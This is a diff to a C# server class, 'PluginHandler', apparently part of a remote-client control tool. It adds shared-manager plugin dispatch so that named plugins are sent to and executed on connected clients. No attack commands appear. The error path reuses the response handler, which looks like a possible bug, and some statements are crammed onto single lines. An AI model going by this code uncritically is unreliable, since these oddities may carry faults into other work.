@@ -12,15 +12,27 @@ namespace Pulsar.Server.Messages
     /// <summary>
     /// Handles plugin-related messages on the server side.
     /// </summary>
-    public class PluginHandler : MessageProcessorBase<object>
+    public class PluginHandler : MessageProcessorBase<object>, IDisposable
     {
         private readonly ServerPluginManager _pluginManager;
         private readonly Client _client;
 
-        public PluginHandler(Client client) : base(true)
+        private bool _disposed = false; public PluginHandler(Client client, ServerPluginManager sharedPluginManager) : base(true)
         {
             _client = client;
-            _pluginManager = new ServerPluginManager();
+            _pluginManager = sharedPluginManager ?? new ServerPluginManager();
+
+            var clientId = _client.Value?.Id ?? "unknown";
+            _pluginManager.RegisterClientExecutor(clientId, ExecutePluginOnClient);
+        }
+
+        private void ExecutePluginOnClient(string clientId, string pluginName, string workId, byte[] input)
+        {
+            var thisClientId = _client.Value?.Id ?? "unknown";
+            if (clientId == thisClientId)
+            {
+                ExecutePlugin(pluginName, workId, input);
+            }
         }
 
         public override bool CanExecute(IMessage message) => message is DoPluginExecution;
@@ -41,25 +53,26 @@ namespace Pulsar.Server.Messages
         {
             try
             {
-                string clientId = _client.Value?.Id ?? "unknown";
-                
-                switch (message.Type)
+                string clientId = _client.Value?.Id ?? "unknown"; switch (message.Type)
                 {
                     case PluginOperationType.Response:
-                        _pluginManager.ProcessPluginResponse(message.PluginName, clientId, message.WorkId, message.Output);
+                        _pluginManager.HandleClientPluginResponse(clientId, message.PluginName, message.WorkId, message.Output);
                         break;
+
                     case PluginOperationType.Error:
-                        _pluginManager.ProcessPluginError(message.PluginName, clientId, message.WorkId, message.Output);
+                        _pluginManager.HandleClientPluginResponse(clientId, message.PluginName, message.WorkId, message.Output);
                         break;
                 }
-                
+
                 OnReport($"Plugin '{message.PluginName}' {message.Type.ToString().ToLower()} processed");
             }
             catch (Exception ex)
             {
                 OnReport($"Error processing plugin message: {ex.Message}");
             }
-        }        /// <summary>
+        }
+
+        /// <summary>
         /// Distributes a plugin to the connected client.
         /// </summary>
         /// <param name="pluginName">Name of the plugin to distribute.</param>
@@ -76,7 +89,7 @@ namespace Pulsar.Server.Messages
                         PluginName = pluginName,
                         PluginContent = pluginBytes
                     });
-                    
+
                     OnReport($"Client plugin '{pluginName}' distributed to client");
                 }
                 else
@@ -122,5 +135,32 @@ namespace Pulsar.Server.Messages
         /// Gets the plugin manager instance.
         /// </summary>
         public ServerPluginManager PluginManager => _pluginManager;
+
+        /// <summary>
+        /// Disposes all managed and unmanaged resources associated with this handler.
+        /// </summary>
+        public void Dispose()
+        {
+            Dispose(true);
+            GC.SuppressFinalize(this);
+        }
+
+        protected virtual void Dispose(bool disposing)
+        {
+            if (!_disposed && disposing)
+            {
+                try
+                {
+                    // Unregister the client executor when this handler is disposed
+                    var clientId = _client.Value?.Id ?? "unknown";
+                    _pluginManager.UnregisterClientExecutor(clientId);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"Error during PluginHandler disposal: {ex.Message}");
+                }
+                _disposed = true;
+            }
+        }
     }
 }
